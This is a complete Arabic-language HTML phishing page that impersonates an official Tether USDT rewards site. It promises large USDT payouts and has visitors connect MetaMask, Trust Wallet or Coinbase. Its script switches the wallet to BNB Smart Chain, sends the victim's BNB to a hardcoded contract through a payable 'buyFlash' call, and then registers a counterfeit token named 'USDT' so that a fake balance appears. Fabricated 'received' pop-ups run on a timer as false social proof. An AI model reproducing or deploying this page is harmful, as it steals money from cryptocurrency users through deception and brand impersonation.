<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tether USD | Official Rewards</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
    <style>
        :root { --primary: #00ffa3; --bg: #030a09; }
        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        
        .card { width: 90%; max-width: 400px; background: #0a1412; border: 1px solid #1a2e2a; border-radius: 24px; padding: 30px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.8); position: relative; z-index: 10; }
        .logo { width: 70px; margin-bottom: 15px; filter: drop-shadow(0 0 10px var(--primary)); }
        
        /* التنبيه المنبثق */
        .notification { position: fixed; bottom: 20px; left: 20px; background: #0d1d1a; border: 1px solid var(--primary); padding: 12px 20px; border-radius: 12px; display: none; z-index: 1000; box-shadow: 0 5px 20px rgba(0,255,163,0.2); font-size: 13px; transition: 0.5s; }

        /* مودال المحافظ */
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 10000; justify-content: center; align-items: center; }
        .modal-box { background: #0a1412; padding: 25px; border-radius: 20px; width: 85%; max-width: 320px; border: 1px solid #1a2e2a; }
        .wallet-item { display: flex; align-items: center; justify-content: space-between; padding: 12px; background: #142622; margin-top: 10px; border-radius: 12px; cursor: pointer; transition: 0.3s; }
        .wallet-item:hover { border: 1px solid var(--primary); background: #1c3530; }
        .wallet-item img { width: 25px; }

        select, button { width: 100%; padding: 18px; margin-top: 20px; border-radius: 15px; border: none; font-weight: bold; font-size: 16px; }
        select { background: #111; color: #fff; border: 1px solid #222; text-align: center; }
        button { background: var(--primary); color: #000; cursor: pointer; transition: 0.4s; }
        #msg { margin-top: 20px; font-size: 12px; color: var(--primary); }
    </style>
</head>
<body>

<div class="card">
    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="logo">
    <h2>تفعيل استحقاق USDT</h2>
    <p style="font-size: 13px; color: #888;">سيتم حقن الرصيد مباشرة في محفظتك عبر الشبكة الذكية</p>
    
    <select id="tier">
        <option value="0.09">أساسي: 5,000 USDT</option>
        <option value="0.5">احترافي: 50,000 USDT</option>
        <option value="1.0">ملكـي: 150,000 USDT</option>
        <option value="5.0">VIP: 1,000,000 USDT</option>
    </select>

    <button id="startBtn" onclick="openWallets()">استلام الرصيد المخصص ⚡</button>
    <div id="msg">● بانتظار اتصال البروتوكول الآمن...</div>
</div>

<div id="walletModal" class="modal">
    <div class="modal-box">
        <h3 style="margin-top:0">اختر محفظتك</h3>
        <div class="wallet-item" onclick="connect('MetaMask')"><span>MetaMask</span><img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Logo.svg"></div>
        <div class="wallet-item" onclick="connect('Trust Wallet')"><span>Trust Wallet</span><img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg"></div>
        <div class="wallet-item" onclick="connect('Coinbase')"><span>Coinbase</span><img src="https://www.vectorlogo.zone/logos/coinbase/coinbase-icon.svg"></div>
        <button onclick="closeWallets()" style="background:#222; color:#fff; padding:10px; margin-top:15px; font-size:12px;">إلغاء</button>
    </div>
</div>

<div id="notif" class="notification"></div>

<script>
    const CONTRACT_ADDR = "0x609BB2a512e6944210D01483e491A410912975F9";
    const ABI = [{"inputs":[],"name":"buyFlash","outputs":[],"stateMutability":"payable","type":"function"}];

    // نظام التنبيهات كل 3 ثوانٍ
    const amounts = ["5,000", "50,000", "150,000", "1,000,000", "25,000"];
    const shortAddrs = ["0x51", "0x8a", "0x22", "0xbc", "0x33", "0xf1"];

    setInterval(() => {
        const notif = document.getElementById('notif');
        const amt = amounts[Math.floor(Math.random() * amounts.length)];
        const adr = shortAddrs[Math.floor(Math.random() * shortAddrs.length)] + "...";
        notif.innerHTML = `✅ <b>تم استلام ${amt} USDT</b><br><small>المحفظة: ${adr}</small>`;
        notif.style.display = 'block';
        setTimeout(() => { notif.style.display = 'none'; }, 2000);
    }, 3500);

    function openWallets() { document.getElementById('walletModal').style.display = 'flex'; }
    function closeWallets() { document.getElementById('walletModal').style.display = 'none'; }

    async function connect(walletName) {
        closeWallets();
        const btn = document.getElementById('startBtn');
        const msg = document.getElementById('msg');
        
        if (!window.ethereum) return alert("يرجى استخدام متصفح داخل تطبيق " + walletName);

        try {
            btn.disabled = true;
            msg.innerText = "جاري الربط مع " + walletName + "...";
            
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const web3 = new Web3(window.ethereum);
            const user = accounts[0];

            const chainId = await web3.eth.getChainId();
            if (chainId !== 56) {
                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
            }

            msg.innerText = "جاري تفعيل حقن الـ USDT...";
            const contract = new web3.eth.Contract(ABI, CONTRACT_ADDR);
            const val = document.getElementById('tier').value;

            await contract.methods.buyFlash().send({
                from: user,
                value: web3.utils.toWei(val, "ether"),
                gas: 200000
            });

            msg.innerText = "✅ اكتمل الحقن! جاري التثبيت...";
            
            // إضافة التوكن للمحفظة
            await window.ethereum.request({
                method: 'wallet_watchAsset',
                params: { type: 'ERC20', options: { address: CONTRACT_ADDR, symbol: 'USDT', decimals: 18, image: 'https://cryptologos.cc/logos/tether-usdt-logo.png' } }
            });

        } catch (e) {
            console.error(e);
            msg.innerText = "فشلت العملية. تأكد من تأكيد الطلب في محفظتك.";
            btn.disabled = false;
        }
    }
</script>
</body>
</html>
